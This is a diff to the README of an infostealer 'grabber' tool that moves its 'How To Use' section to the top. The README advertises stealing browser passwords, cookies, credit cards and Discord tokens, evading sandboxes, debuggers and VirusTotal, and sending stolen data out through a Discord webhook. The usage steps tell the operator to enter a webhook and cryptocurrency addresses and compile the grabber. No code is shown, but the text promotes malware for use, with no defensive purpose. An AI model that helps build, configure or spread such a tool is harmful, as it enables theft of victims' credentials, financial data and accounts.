@@ -2,6 +2,10 @@
 Advanced grabber that grabs browser passwords, cookies, and Discord tokens with the computer information.
 AntiAnalysis (VirtualBox, SandBox, Debugger, VirusTotal, Any.Run)
 
+# How To Use ? 
+Open setup and then add yoru webhook to the field, click next and add your BTC addy and LTC and then customize it according to your needs and click compile
+a folder will open containing your grabber file
+
 Get system info (Version, CPU, GPU, RAM, IPs, BSSID, Location, Screen metrics, Installed apps)
 
 Chromium based browsers (passwords, credit cards, cookies, history, autofill, bookmarks)
@@ -40,6 +44,4 @@ Transfers via Discord webhook
 Searches for authorization tokens in multiple directories (Discord, Discord PTB, Discord Canary, Google chrome, Opera, Brave and Yandex)
 No external Python modules required
 
-How To Use ? 
-Open setup and then add yoru webhook to the field, click next and add your BTC addy and LTC and then customize it according to your needs and click compile
-a folder will open containing your grabber file
+
